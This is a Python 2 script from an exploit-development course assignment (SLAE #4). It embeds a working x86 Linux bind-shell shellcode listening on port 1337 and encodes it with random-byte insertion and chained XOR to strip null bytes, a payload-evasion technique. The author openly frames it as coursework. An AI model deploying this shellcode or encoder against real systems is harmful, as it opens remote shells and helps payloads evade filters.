#!/usr/bin/python
 
# SLAE - Assignment #4: Custom Shellcode Encoder/Decoder
# Author:   Julien Ahrens (@MrTuxracer)
# Website:  http://www.rcesecurity.com 

from random import randint

# Payload: Bind Shell SLAE-Assignment #1
shellcode = "\x6a\x66\x58\x6a\x01\x5b\x31\xf6\x56\x53\x6a\x02\x89\xe1\xcd\x80\x5f\x97\x93\xb0\x66\x56\x66\x68\x05\x39\x66\x53\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x56\x57\x89\xe1\xcd\x80\xb0\x66\x43\x56\x56\x57\x89\xe1\xcd\x80\x59\x59\xb1\x02\x93\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x41\x89\xca\xcd\x80"

badchars = ["\x00"]

def xorBytes(byteArray):
	# Randomize first byte
	rnd=randint(1,255)
	xor1=(rnd ^ byteArray[0])
	xor2=(xor1 ^ byteArray[1])
	xor3=(xor2 ^ byteArray[2])

	xorArray=bytearray()
	xorArray.append(rnd)
	xorArray.append(xor1)
	xorArray.append(xor2)
	xorArray.append(xor3)
	
	return cleanBadChars(byteArray, xorArray, badchars)

def cleanBadChars(origArray, payload, badchars):
	for k in badchars:
		# Ooops, BadChar found :( Do XOR stuff again with a new random value
		# This could run into an infinite loop in some cases
		if payload.find(k) >= 0:
			payload=xorBytes(origArray)
	
	return payload

def encodeShellcode (byteArr):
	shellcode=bytearray()
	shellcode.extend(byteArr)
	
	encoded=bytearray()
	tmp=bytearray()
	final=""

	# Check whether shellcode is aligned
	if len(shellcode) % 3 == 1:
		shellcode.append(0x90)
		shellcode.append(0x90)
	elif len(shellcode) % 3 == 2:
		shellcode.append(0x90)

	# Loop to split shellcode into 3-byte-blocks
	for i in range(0,len(shellcode),3): 
		tmp_block=bytearray()
		tmp_block.append(shellcode[i])
		tmp_block.append(shellcode[i+1])
		tmp_block.append(shellcode[i+2])
			
		# Do the RND-Insertion and chained XORs
		tmp=xorBytes(tmp_block)
				
		# Some formatting things for easier use in NASM :)
		for y in tmp:
			if len(str(hex(y))) == 3:
				final+=str(hex(y)[:2]) + "0" + str(hex(y)[2:])+","
			else:
				final+=hex(y)+","
				
	return final[:-1]
			
print "Encoded Shellcode:\r"
print encodeShellcode(shellcode)
